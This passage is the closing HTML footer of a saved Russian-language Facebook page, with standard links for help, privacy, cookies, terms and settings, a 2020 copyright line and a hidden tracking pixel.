                        <li><a href="https://developers.facebook.com/?ref=pf" title="Развивайтесь на нашей платформе.">Разработчикам</a></li>
                        <li><a href="https://ru-ru.facebook.com/careers/?ref=pf" title="Сделайте следующий шаг в карьере в нашей отличной компании.">Вакансии</a></li>
                        <li><a data-nocookies="1" href="https://ru-ru.facebook.com/privacy/explanation" title="Узнайте о своей конфиденциальности на Facebook.">Конфиденциальность</a></li>
                        <li><a href="https://ru-ru.facebook.com/policies/cookies/" title="Узнайте больше о cookies и Facebook." data-nocookies="1">Файлы cookie</a></li>
                        <li><a class="_41ug" data-nocookies="1" href="https://ru-ru.facebook.com/help/568137493302217" title="Подробнее о выборе рекламы.">Выбор рекламы<i class="img sp_0eOQhLgQG2U sx_7cd432"></i></a></li>
                        <li><a data-nocookies="1" href="https://ru-ru.facebook.com/policies?ref=pf" accesskey="9" title="Просмотрите наши условия и правила.">Условия использования</a></li>
                        <li><a href="https://ru-ru.facebook.com/help/?ref=pf" accesskey="0" title="Посетите наш Справочный центр.">Справка</a></li>
                        <li><a accesskey="6" class="accessible_elem" href="https://ru-ru.facebook.com/settings" title="Посмотреть и отредактировать настройки Facebook.">Настройки</a></li>
                        <li><a accesskey="7" class="accessible_elem" href="https://ru-ru.facebook.com/allactivity?privacy_source=activity_log_top_menu" title="Посмотреть Журнал действий">Журнал действий</a></li>
                    </ul>
                </div>
                <div class="mvl copyright">
                    <div><span> Facebook © 2020</span></div>
                </div>
            </div>
        </div>
    </div>
    <div></div><span><img src="index_files/hsts-pixel.gif" style="display:none" width="0" height="0"></span>
</div>


</body>

</html>
